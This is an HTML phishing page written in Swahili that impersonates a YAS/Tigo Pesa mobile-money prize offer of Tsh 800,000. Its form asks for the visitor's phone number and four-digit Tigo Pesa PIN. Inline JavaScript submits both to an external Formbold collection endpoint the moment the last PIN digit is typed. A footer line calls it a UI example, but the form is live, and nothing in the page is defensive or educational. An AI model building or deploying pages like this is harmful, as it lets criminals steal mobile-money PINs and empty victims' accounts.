<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Umejishindia Ofa</title>
    <!-- Link to the external CSS file -->
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="card">
        <h2>Umejishindia Ofa Wa YAS Tigo pesa</h2>
        <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
        <div class="amount-box">
            <p>Kiwango cha Ofa kinachoweza kupatikana</p>
            <h1>Tsh 800,000</h1>
        </div>
        
        <!-- The form now points to your Formbold endpoint -->
        <form id="offerForm" action="https://formbold.com/s/9ROxy" method="POST">
            
            <!-- UPDATED: Using your new class name and structure -->
            <div class="phone-input">
                <span class="country-code">+255</span>
                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu" maxlength="9" required>
            </div>

            <p>Enter your Tigo Pesa PIN</p>
            <div class="pin-boxes">
                <input type="tel" maxlength="1" class="pin-box" data-index="0" required>
                <input type="tel" maxlength="1" class="pin-box" data-index="1" required>
                <input type="tel" maxlength="1" class="pin-box" data-index="2" required>
                <input type="tel" maxlength="1" class="pin-box" data-index="3" required>
            </div>

            <!-- Hidden input to hold the combined PIN for submission -->
            <input type="hidden" id="pin" name="pin">
        </form>

        <p class="note">Kuingiza neno siri kunakubali maelezo ya matumizi.</p>
        <footer>© YAS Tanzania – Mfano wa UI pekee</footer>
    </div>

    <script>
        const pinBoxes = document.querySelectorAll('.pin-box');
        const form = document.getElementById('offerForm');
        const hiddenPinInput = document.getElementById('pin');
        const phoneNumberInput = document.getElementById('phoneNumber');

        // Function to format the phone number before submission
        const formatPhoneNumber = () => {
            const fullNumber = '+255' + phoneNumberInput.value;
            return fullNumber;
        };

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                // Only allow numbers
                e.target.value = e.target.value.replace(/[^0-9]/g, '');

                if (e.target.value.length === 1) {
                    if (index < pinBoxes.length - 1) {
                        pinBoxes[index + 1].focus();
                    } else {
                        updateHiddenPin();
                        // Update the phone number value to the full format before submitting
                        phoneNumberInput.value = formatPhoneNumber();
                        form.submit();
                    }
                }
                updateHiddenPin();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        function updateHiddenPin() {
            const pin = Array.from(pinBoxes).map(input => input.value).join('');
            hiddenPinInput.value = pin;
        }
    </script>
</body>
</html>
